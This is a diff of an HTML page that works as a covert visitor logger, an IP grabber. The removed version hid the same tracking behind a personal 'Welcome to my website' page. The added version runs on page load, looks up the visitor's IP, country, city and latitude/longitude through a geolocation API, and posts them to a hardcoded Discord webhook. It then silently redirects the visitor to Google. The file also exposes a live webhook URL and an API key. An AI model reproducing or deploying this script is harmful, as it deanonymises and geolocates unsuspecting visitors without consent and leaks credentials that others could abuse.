@@ -3,140 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Not Yet Done</title>
-    <style>
-        body {
-            background: linear-gradient(to right, #add8e6, #dda0dd);
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            height: auto; /* Allow height to grow based on content */
-            margin: 0;
-            padding: 20px; /* Add some spacing for readability */
-            overflow-y: auto; /* Ensure vertical scrolling is enabled */
-        }
-
-        h1 {
-            font-size: 2em;
-            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
-        }
-
-        button {
-            background: #dda0dd;
-            border: none;
-            border-radius: 5px;
-            color: #ffffff;
-            font-size: 1.2em;
-            padding: 10px 20px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.2s ease;
-        }
-
-        button:hover {
-            background: #add8e6;
-            transform: scale(1.1); /* Add a smooth pop-up effect on hover */
-        }
-
-        button:active {
-            transform: scale(1); /* Return to normal size when clicked */
-        }
-    </style>
+    <title>Enhanced Visitor Info Logger</title>
 </head>
 <body>
-    <h1>Welcome to my website.</h1>
-    <button onclick="redirectToPage()">About me</button>
-
+    <h1>Gathering Information...</h1>
     <script>
-        function redirectToPage() {
-            window.location.href = 'page1.html'; // Redirect to page1.html
-        }
-
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
+        const redirectURL = 'https://www.google.com';
+        const ipFlareApiKey = 'd1e499e1d5842e97.b83b5e9e9e0197ab0a66eb4df3c8b707a05ab80b9f8d27598627804ad8478f27';
 
-        function getIPAddress() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(error => console.error('Error fetching IP:', error));
-        }
-
-        function getLocation(ip) {
-            const url = ip ? `https://freeipapi.com/api/json/${ip}` : `https://freeipapi.com/api/json/`;
-            return fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    return `${data.city}, ${data.countryName}`;
-                })
-                .catch(error => {
-                    console.error('Error fetching location:', error);
-                    return 'Location unknown';
+        // Function to get geolocation data from IP Flare
+        async function getGeolocation() {
+            try {
+                const response = await fetch('https://api.ipflare.io/', {
+                    method: 'GET',
+                    headers: {
+                        'X-API-Key': ipFlareApiKey
+                    }
                 });
-        }
-
-        function getBatteryInfo() {
-            if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
-            } else {
-                return Promise.resolve('Battery info not available');
+                if (!response.ok) throw new Error('Failed to fetch geolocation');
+                return await response.json();
+            } catch (error) {
+                console.error('Error fetching geolocation:', error);
+                return null;
             }
         }
 
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
-            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
-
-            return `
-                User-Agent: ${userAgent}
-                Platform: ${platform}
-                Language: ${language}
-                Timezone: ${timezone}
-                Mobile Device: ${isMobile}
-                Screen Resolution: ${screenResolution}
-                Screen Orientation: ${screenOrientation}
-            `;
-        }
-
-        function sendToDiscord(ip, location, battery, deviceInfo) {
+        // Function to send data to Discord webhook
+        async function sendToDiscord(geoData) {
+            const timestamp = new Date().toLocaleString();
             const payload = {
                 embeds: [{
-                    title: "New Visitor Information",
-                    color: 7506394,
+                    title: "📋 Visitor Information Logged",
+                    color: 3447003,
                     fields: [
-                        { name: "IP Address", value: ip, inline: true },
-                        { name: "Location", value: location || 'N/A', inline: true },
-                        { name: "Battery Level", value: battery, inline: true },
-                        { name: "Device Info", value: deviceInfo, inline: false },
-                        { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ip}` }
+                        { name: "IP Address", value: geoData?.ip || "Unknown", inline: true },
+                        { name: "Country", value: geoData?.country_name || "Unknown", inline: true },
+                        { name: "Region", value: geoData?.region || "Unknown", inline: true },
+                        { name: "City", value: geoData?.city || "Unknown", inline: true },
+                        { name: "Latitude", value: geoData?.latitude || "Unknown", inline: true },
+                        { name: "Longitude", value: geoData?.longitude || "Unknown", inline: true }
                     ],
-                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
+                    footer: { text: `Logged at: ${timestamp}` }
                 }]
             };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(response => {
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
                 if (response.ok) {
                     console.log('Visitor info logged successfully');
+                    window.location.href = redirectURL;
                 } else {
                     console.error('Failed to log visitor info:', response.statusText);
                 }
-            }).catch(error => console.error('Error sending to webhook:', error));
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
         }
 
-        Promise.all([getIPAddress(), getBatteryInfo()])
-            .then(([ip, battery]) => {
-                const deviceInfo = getDeviceInfo();
-                getLocation(ip).then(location => {
-                    sendToDiscord(ip, location, battery, deviceInfo);
-                });
-            });
+        // Main execution
+        (async () => {
+            const geoData = await getGeolocation();
+            await sendToDiscord(geoData);
+        })();
     </script>
 </body>
 </html>
